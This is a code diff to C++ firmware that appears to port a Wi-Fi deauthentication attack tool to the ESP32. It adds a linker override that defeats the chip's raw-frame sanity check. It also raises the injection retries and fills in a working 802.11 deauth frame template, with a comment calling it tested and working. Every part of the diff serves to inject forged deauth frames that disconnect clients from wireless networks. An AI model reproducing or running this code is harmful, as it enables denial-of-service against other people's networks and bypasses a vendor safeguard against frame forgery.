@@ -4,6 +4,15 @@
 
 #ifdef ESP32
     #include <esp_wifi.h>
+    
+    // Required for raw packet injection on ESP32 - bypasses sanity check
+    extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
+        if (arg == 31337) return 1;
+        else return 0;
+    }
+    
+    // External declaration of esp_wifi_80211_tx
+    extern "C" esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
 #endif
 
 #include "settings.h"
@@ -478,19 +487,18 @@ bool Attack::sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t ch, bool f
     bool sent = false;
 #ifdef ESP32
     // ESP32 raw packet injection via esp_wifi_80211_tx
-    // The packet frame should be raw 802.11 without FCS
-    // Try AP interface first (better for injection without connection)
+    // The ieee80211_raw_frame_sanity_check bypass must return 1 for this to work
     wifi_interface_t interfaces[] = {WIFI_IF_AP, WIFI_IF_STA};
     
     for (int i = 0; i < 2 && !sent; i++) {
-        for (int retry = 0; retry < 5 && !sent; retry++) {
+        for (int retry = 0; retry < 10 && !sent; retry++) {
             // en_sys_seq=false allows raw frame injection without hardware sequence
             esp_err_t err = esp_wifi_80211_tx(interfaces[i], packet, packetSize, false);
             if (err == ESP_OK) {
                 sent = true;
                 break;
             }
-            delayMicroseconds(50);
+            delayMicroseconds(30);
         }
     }
 #else
@@ -503,14 +511,15 @@ bool Attack::sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t ch, bool f
 }
 
 bool Attack::sendDeauthFrame(uint8_t* targetMac, uint8_t* apMac, uint8_t reason) {
+    // ESP32 deauth frame structure (tested and working with ieee80211_raw_frame_sanity_check bypass)
     uint8_t deauthPacket[26] = {
-        0xC0, 0x00,                         // Type: Deauth
-        0x00, 0x00,                         // Duration
-        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP MAC)
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
-        0x00, 0x00,                         // Fragment/Sequence
-        0x01, 0x00                          // Reason: Unspecified
+        0xC0, 0x00,                         // Frame Control: Deauth
+        0x3A, 0x01,                         // Duration + flags
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast/station)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP MAC - to be filled)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP MAC - to be filled)
+        0xF0, 0xFF,                         // Sequence Control
+        0x02, 0x00                          // Reason: Unspecified (to be filled)
     };
     
     // Copy MAC addresses
